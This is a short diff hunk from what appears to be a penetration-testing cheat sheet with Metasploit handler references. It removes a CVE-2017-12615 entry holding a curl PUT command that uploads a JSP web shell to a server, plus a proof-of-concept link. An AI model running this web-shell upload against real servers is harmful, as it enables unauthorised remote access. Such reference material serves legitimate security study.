@@ -48,8 +48,3 @@ msf5 exploit(multi/handler) > run
 https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom
 https://www.offensive-security.com/metasploit-unleashed/fun-incognito/
 
-### [CVE-2017-12615]
-```
-curl -X PUT https://example/path/where/to/put/shell.jsp/ -d @- < shell.jsp
-```
-https://github.com/breaktoprotect/CVE-2017-12615
